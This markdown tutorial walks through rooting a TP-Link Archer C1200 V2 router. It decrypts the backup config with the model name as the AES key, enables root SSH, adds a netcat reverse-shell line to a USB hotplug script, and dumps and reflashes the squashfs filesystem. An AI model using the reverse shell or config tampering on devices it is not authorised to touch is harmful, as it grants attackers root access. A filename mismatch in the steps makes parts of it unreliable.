# Hack and Flash Archer C1200 V2

## Table of Contents

- [Hack and Flash Archer C1200 V2](#hack-and-flash-archer-c1200-v2)
  - [Table of Contents](#table-of-contents)
  - [Disclaimer](#disclaimer)
  - [Preparation](#preparation)
    - [Build Openssl](#build-openssl)
    - [Router Preparation](#router-preparation)
    - [Modifying *.bin* Config File](#modifying-bin-config-file)
    - [Connecting via ssh](#connecting-via-ssh)
    - [Merge the File System into a File and Retrieve it](#merge-the-file-system-into-a-file-and-retrieve-it)
    - [Unpack File System](#unpack-file-system)
    - [Pack File System](#pack-file-system)
    - [Upload File System to Router](#upload-file-system-to-router)

## Disclaimer

This guide is provided for educational and informational purposes only. The procedures outlined involve modifying router firmware, which may void the warranty and could potentially lead to unintended consequences, such as rendering the device non-functional. The user assumes all risks associated with these actions.

It's crucial to acknowledge that altering device firmware may violate the manufacturer's terms of service and could have legal implications. The information presented here is not endorsed or encouraged by the router manufacturer or any other relevant parties.

Before attempting any modifications, ensure you have a clear understanding of the potential risks involved, and proceed at your own discretion. If you are uncertain or uncomfortable with these procedures, it is recommended to seek professional assistance or consult the manufacturer's official documentation.

The author and contributors of this guide are not responsible for any damage, loss of data, or adverse effects resulting from the implementation of the described procedures. Always exercise caution and adhere to ethical standards when engaging in such activities.

## Preparation

### Build Openssl

```Bash
sudo apt-get install libz-dev zlib1g-dev git build-essential libssl-dev linux-headers-$(uname -r) make ssh scp
wget https://www.openssl.org/source/old/1.1.1/openssl-1.1.1h.tar.gz --no-check-certificate
tar -zxvf  openssl-1.1.1h.tar.gz openssl-1.1.1h/
cd openssl-1.1.1h/
./config zlib
make
sudo make install
```

### Router Preparation

1. Reset the router to default settings (factory reset);
2. Wait for the router to turn on;
3. At the password prompt, enter admin in all fields;
4. Click on the "Advanced" button at the top (why the hell do we need a basic install..?);
5. Go to System tools > `Backup & Restore`;
6. Click on "Backup";

### Modifying *.bin* Config File

1. Go to the folder where you downloaded the file and rename it to `config.bin`.

2. Execute:

    ```Bash
    openssl aes-256-cbc -d -in config.bin -k 'Archer C1200' -md md5 | openssl zlib -d -out config.tar
    ```

    > Yea, AES password from the settings is the router model! S is security!

3. Open the tar archive, we have two files,
we need to change with the name `ori-backup-user-config.bin`.

    Find the tag `<dropbear>` (there are two, one in the other).

    And replace the whole tag, including the inner tag, to make it like this:

    ```XML
    <dropbear>
    <dropbear>
    <RemoteSSH>on</RemoteSSH>
    <RootPasswordAuth>on</RootPasswordAuth>
    <Port>22</Port>
    <SysAccountLogin>off</SysAccountLogin>
    <PasswordAuth>on</PasswordAuth>
    </dropbear>
    </dropbear>
    ```

4. Save the file, put it back in the archive and replace it in its place.

5. Now you need to encrypt the file back.

    Execute:

    ```Bash
    openssl zlib -in config.tar | openssl aes-256-cbc -out config.bin -k 'Archer C1200' -md md5
    ```

6. In router web:
   1. Go to System tools > `Backup & Restore`;
   2. Click on "Browse," upload the changed .bin file;
   3. Click on "Restore".
   4. Wait until the router reboots.

### Connecting via ssh

```Bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@192.168.0.1
```

> Where `192.168.0.1` is router ip, password is `admin`.

You need to edit the file `/etc/hotplug.d/usb/10-usb`.

Add to it after the line `ledcli ${USB}_twinkle`:

```Bash
mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.2 12345 > /tmp/f```
```

> Where `192.168.0.2` is you machine ip

Note:

> Nano is not available on the router, use `vi` (to start editing press `i`, to finish press `ESC` then type `:wq`)

Next, plug the flash drive into the router.

Execute it on **your** machine:

```Bash
nc -l -p 12345
```

### Merge the File System into a File and Retrieve it

Execute in **nc** terminal:

```Bash
sh
nvrammanager --read=/tmp/fssystem --partition=file-system
chmod 777 /tmp/fssystem
```

Execute it on **your** machine in another terminal:

```Bash
scp -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@192.168.0.1:/tmp/fssystem fssystem
```

### Unpack File System

Execute it on **your** machine in another terminal:

```Bash
unsquashfs fsystem
```

> Now we can completely modify any router firmware files at our discretion!

### Pack File System

Execute it on **your** machine in another terminal:

```Bash
mksquashfs squashfs-root squash.fs -noappend -all-root -comp xz -xattrs
```

### Upload File System to Router

Execute it on **your** machine in another terminal:

```Bash
scp -oKexAlgorithms=+diffie-hellman-group1-sha1 squash.fs admin@192.168.0.1:/tmp/squash.fs
```

**You can now reboot the router. It will boot with the new firmware.**

> Mischief Managed!

Tags: #linux, #hack, #hardware
